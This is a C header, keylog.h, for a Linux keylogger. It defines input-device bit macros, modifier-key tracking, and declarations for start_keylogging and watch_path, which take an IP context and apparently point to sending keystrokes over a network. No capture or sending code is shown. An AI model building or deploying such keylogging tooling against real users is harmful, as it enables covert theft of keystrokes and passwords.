#ifndef KEYLOG_H
#define KEYLOG_H

#include "fsm.h"
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>
#include <linux/input.h>
#include <pthread.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <unistd.h>

#define BITS_PER_LONG (sizeof(long) * 8)
#define NBITS(x) ((((x) - 1) / BITS_PER_LONG) + 1)
#define OFF(x) ((x) % BITS_PER_LONG)
#define BIT(x) (1UL << OFF(x))
#define LONG(x) ((x) / BITS_PER_LONG)
#define test_bit(bit, array) ((array[LONG(bit)] >> OFF(bit)) & 1)

// USB HID usage codes for Parallels workaround
#define HID_USAGE_KEYBOARD_LEFTSHIFT ((uint32_t)0x700e1)
#define HID_USAGE_KEYBOARD_RIGHTSHIFT ((uint32_t)0x700e5)

#define PATH_MAX_LEN 512
#define EVENT_BUF_LEN (1024 * (sizeof(struct inotify_event) + NAME_MAX + 1))

static volatile sig_atomic_t running              = 1;
static uint32_t              last_scan_code       = 0;
static int                   last_scan_code_valid = 0;
static int                   last_scan_consumed   = 0;
static struct timeval        start_time           = {0, 0};
static int                   start_time_valid     = 0;
static int                   printed_since_syn    = 0;

// Modifier key state tracking
typedef struct
{
    int shift;
    int ctrl;
    int alt;
    int meta;
    int capslock;
} modifier_state_t;

static modifier_state_t modifiers = {0, 0, 0, 0, 0};

typedef struct
{
    ip_info ip_ctx;
} receiver_args_t;

void watch_path(ip_info ip_ctx, const char *path);
int  start_keylogging(ip_info ip_ctx);

#endif // KEYLOG_H
